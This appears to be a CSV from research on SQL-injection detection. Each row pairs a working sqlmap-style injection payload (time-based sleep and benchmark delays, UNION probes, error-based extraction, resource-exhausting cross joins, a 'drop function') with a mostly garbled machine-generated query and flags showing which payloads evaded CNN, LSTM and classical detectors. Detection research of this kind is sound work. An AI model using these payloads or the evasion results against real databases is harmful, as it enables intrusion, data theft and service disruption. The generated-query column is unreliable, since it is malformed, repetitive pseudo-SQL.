,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
9057,"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",SELECT DISTINCT vwyq FROM SQL injection,1,0,1,1,1,1,1
9058,"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM Query: -7940%,1,1,0,1,1,1,0
9059,"1""  )   as axua where 6718  =  6718",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
9060,"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT DISTINCT count ( * ) FROM query_series WHERE NOT efmy = 7299 = 7299 AND 7299 = 7299 AND 8635 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
9061,1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',"SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) ||chr ( 112 ) ||chr ( SELECT, SUM(swift) FROM SELECT, SUM(sw. ) +' FROM SQL - SELECT MIN(swift) FROM SELECT SELECT MIN(sw.chr ( chr ( 2853 = 7329 = 7329)",1,1,0,0,1,0,0
9062,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --","SELECT * FROM SQL, SELECT * FROM Query: 1 WHERE NOT SQL_inject = 1193 AND NOT md5 ( 5000000,concat) = 1193",1,1,0,0,1,0,0
9063,"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",SELECT MIN(sql injection) FROM SQL injection - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
9064,"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SELECT ,1,0,1,0,1,1,0
9065,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk","SELECT * FROM SQL injection, COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4, jkfk = ""evade SQL injection detection""",1,1,0,0,0,0,0
9066,"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection detection) AND NOT (SELECT MIN(%) FROM SQL injection) FROM SQL = '3824 = benchmark' (5000000,md5 ( 0x76555642 )'",1,1,0,0,1,0,0
9067,-6036   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  6723  =  6723,SELECT MIN(SQL) FROM SQL Injection) ORDER BY 6723,0,0,1,1,1,1,1
9068,"1'||  (  select 'gikt' where 8447  =  8447 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 8447 = 8447 OR 8447 = 8447 OR 8422 = 1022 = (SELECT SUM(SELECT SUM(SELECT SUM(*) FROM SQL)),1,1,0,0,1,0,0
9069,"1  )   union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
9070,"1""  )   and 9198  =  9198--",SELECT MIN(9198 = 9198--) FROM SQL injection detection,1,1,0,0,1,0,0
9071,"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz","SELECT MIN(selection) FROM SQL injection, SELECT MIN(selection) FROM SQL - SELECT MIN(selection) FROM SELECT MIN(selection) FROM SQL - SELECT MIN(selection) FROM SELECT MIN(selection) FROM SELECT MIN(selection) FROM SQL - SELECT MIN(selection) FROM SELECT MIN(selection) FROM SELECT SUM((SELECT, SUM(sql injection) FROM SELECT, SUM(sql injection) FROM SELECT, SUM(sql injection) FROM SELECT,SQ(sql injection) FROM SELECT,SQ(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT",0,0,1,0,1,1,0
9072,1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',"SELECT MIN( 4) FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE 5074 = 5074 AND 4386 = utl_inaddr.chr ( 112 ) ||chr ( 112 ) FROM chr ( 112 ) ORDER BY i_chr ( 4386 = 4386)",1,1,0,0,0,0,0
9073,1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,SELECT 'estb' FROM SQL injection detection',1,0,1,1,1,1,1
9074,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ","SELECT MIN(7982,concat) FROM SQL injection",1,1,1,1,1,1,1
9075,-3566%' or 2158  =  6289,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -3566%' OR 2158 = 6289,1,1,0,1,1,1,0
9076,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query,1,0,1,1,1,1,1
9077,"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--","SELECT 2159,2159,2159,2159,2159-- FROM SQL injection_methods WHERE NOT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,1,1,1,1
9078,"1""   )    )    as qgwq where 6122  =  6122",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM qgwq WHERE 6122 = 6122,1,1,1,0,1,1,0
9079,"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE 9447 = 9447 OR 2633 = dbms_pipe.receive_message ( (SELECT SUM(sql injection) FROM SQL_injection),1,1,1,0,1,1,0
9080,"1 and make_set  (  9542  =  8888,8888  )  -- idkn","SELECT * FROM query: 1 AND NOT idkn = ""valid""",1,1,1,0,1,1,0
9081,1%'   )    )    order by 1--,"SELECT MIN(1 * (STRFTIME('%j', CURRENT_TIME()) - SELECT MIN(1 *) FROM SQL injection) FROM SQL injection detection",0,1,0,0,1,0,0
9082,"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ","SELECT MIN(success injection) FROM SQL_Injection WHERE NOT elt ( 0x7171706a71, 0x71706a71, 0x71706a71, 0x7171706a71,'sql injection')",1,1,1,0,1,1,0
9083,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rhli",SELECT MIN(6055 ='sql injection') FROM SQL SELECT MIN(6055 = ctxsys.drithsx.sn) FROM rhli,1,1,0,0,1,0,0
9084,"1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE 8948 = 8948 AND 8635 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
9085,"-9096""  )   where 9452  =  9452 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT, COUNT(*) FROM xr ( xr ( 4144 = 9452 = 9452 = 9452 ORDER BY 113",1,1,0,0,1,0,0
9086, (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,SELECT 9066 FROM SQL injection JOIN (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT) FROM SELECT SUM(inject) FROM SQL Query:) AS _Currential_sets) FROM SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SEL,0,0,1,1,1,1,1
9087,1'   )    )    as jtmf where 3937  =  3937,SELECT MIN(3937 = 3937) FROM SQL injection detection,1,1,1,1,1,1,1
9088,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""rbqs""  =  ""rbqs",SELECT rbqs FROM SQL injection JOIN (SELECT rbqs FROM SQL SELECT rbqs) FROM SQL SELECT rbqs FROM SELECT rbqs FROM SQL SELECT rbqs FROM SELECT rbqs) FROM SQL JOIN detection of evade SQL injection detection,0,0,1,1,1,1,1
9089,"1   )    )    union all select null,null,null,null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null,null,null FROM SQL - SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SEL",1,0,1,0,1,1,0
9090,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'hpbt'  =  'hpbt",SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = 1 AND NOT all_users = 1 AND (SELECT SUM(*) FROM SQL injection detection),0,1,0,0,1,0,0
9091,-9975 where 9760  =  9760 order by 1--,SELECT -9975 FROM SQL_Query: -9975 WHERE 9760 = 9760 ORDER BY 1-for_for,1,1,1,1,0,1,0
9092,"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(selection) FROM SQL injection detection WHERE NOT 0x7171706a71 = ""SQL"" GROUP BY concat (0x7171706a71,0x71706a71,floor (Rad ( 0 ) *2 )",1,1,0,0,0,0,0
9093,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf",SELECT MIN(sleep ( 5 ) & (SELECT MIN(sleep) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
9094,1'+  (  select hrgu where 9587  =  9587,SELECT hrgu FROM SQL injection_description WHERE 9587 = 9587,1,1,1,1,1,1,1
9095,select case when 8237  =  9948 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 8237 = 9948 AND NOT 8237 = 9948,1,1,0,0,0,0,0
9096,"-3781%'  )   union all select 7497,7497,7497,7497,7497--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT 7497,7497,7497,7497-- FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM 7497,7497,7497,7497-- SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM ",1,1,1,0,1,1,0
9097,waitfor delay '0:0:5' and '%'  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
9098,1' where 9544  =  9544,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
9099,"1%' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM query: 1%' OR query: 'yes' ORDER BY MIN(sql),1,1,0,0,1,0,0
9100,"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'qdsr' like 'qdsr",SELECT MIN(sqdsr) FROM SQL injection detection,1,1,1,1,1,1,1
9101,"1%'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",SELECT MIN(sequence) FROM SQL injection detection) AND (SELECT MIN(sequence) FROM SQL injection detection) AND (SELECT MIN(sequence) FROM SQL injection detection) AND (SELECT MIN(sequence) FROM SQL injection detection),1,1,1,0,1,1,0
9102,if  (  5316  =  4416  )   select 5316 else drop function vtve--,SELECT MIN(SQL injection) FROM 5316 ORDER BY COUNT(*) DESC LIMIT 1,1,1,1,1,1,1,1
9103,"-5169""   )    )    union all select 6198,6198,6198,6198--",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
9104,"1"" where 8234  =  8234",SELECT MIN(8234 = 8234) FROM SQL injection detection,1,1,0,1,1,1,0
9105,"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT DISTINCT esq_injection FROM SQL_injection WHERE 3277 = 3277 AND 3715 = 3715 AND 113 = 3715,1,1,0,1,0,0,0
9106,"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SELECT DISTINCT t1.short_name FROM SQL_injection_methods AS t1 JOIN 3422 = 3422 OR t1.115 = 113 +char ( 113 ) +char ( 113 ) +char ( 113 ) FROM SQL injection detection WHERE t2.3422 = 3422 = 3422 OR t2.342 = 3422 OR t2.loc = '1570 = convert (SELECT t1.short_name,'sql injection')",0,1,0,0,0,0,0
9107,"1   )    )    as qfnu where 1609  =  1609 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(sqfnu) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN qfnu's SQL injection detection'",1,1,0,0,0,0,0
9108,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'xfmq'  =  'xfmq",SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = 1 AND NOT all_users = 1 AND 'xfmq = 'xfmq',0,1,0,0,0,0,0
9109,1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,SELECT MIN(SQL) FROM SQL injection detection) FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM XDER BY MIN(SQL),1,0,1,0,1,1,0
9110,"-8358'   )    )     )   union all select 7282,7282--","SELECT DISTINCT esq injection detection FROM SQL SELECT 7282,7282-- FROM SQL SELECT SELECT MIN(7282--) FROM SQL SELECT MIN(7282 - Deleted FROM SQL SELECT MIN(7282 - Deleted) FROM SQL SELECT MIN(7282 - Deleted) FROM SQL SELECT MIN(7282 - Deleted) FROM SQL",1,1,1,1,1,1,1
9111,-7726 or 3038  =  3038,SELECT MIN(3038 = 3038) FROM SQL AS _7726 WHERE NOT SQL_injection = 'valid',1,1,0,0,0,0,0
9112,"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz","SELECT rurz FROM SQL injection JOIN (SELECT rurz FROM dbms_pipe.receive_message WHERE NOT rurz = ""rurz"" ORDER BY rurz)",0,0,1,0,1,1,0
9113,"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT crypt_key ='sql injection',1,1,1,1,1,1,1
9114,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",SELECT MIN(sql injection) FROM SQL_injection',0,1,1,1,1,1,1
9115,"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127","SELECT MIN(success injection) FROM SQL_Injection GROUP BY 0x7171706a71,0x71706a71,0x71706a71,0x71706a71,0x71706a71,0x717a71,0x71706a71,0x717a71,0x71706a71,0x717a71,0x71706a71,0x7171706a71, 0x7171706a71,'sq injection'",1,1,1,1,0,1,0
9116,1' where 4403  =  4403 rlike sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
9117,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--","SELECT MIN(suel injection) FROM SQL_Injection WHERE NOT 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349,6349-- for = ""SQL injection detection""",1,1,1,1,0,1,0
9118,"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  ""","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) AND NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_INVITION WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 ) AND ((((((((SELECT SUM(((*) FROM SQL SELECT MIN(SELECT SUM(CASE WHEN SUM(sysusers as sys4,sysusers as sys7) FROM SELECT SELECT SUM((SELECT SUM((*) FROM SQL SELECT MIN(sysusers as sys1,sysusers as sys4,sysusers as sys7) FROM SELECT SUM(((((*) FROM SQL injection) AS sysuser",1,1,0,0,0,0,0
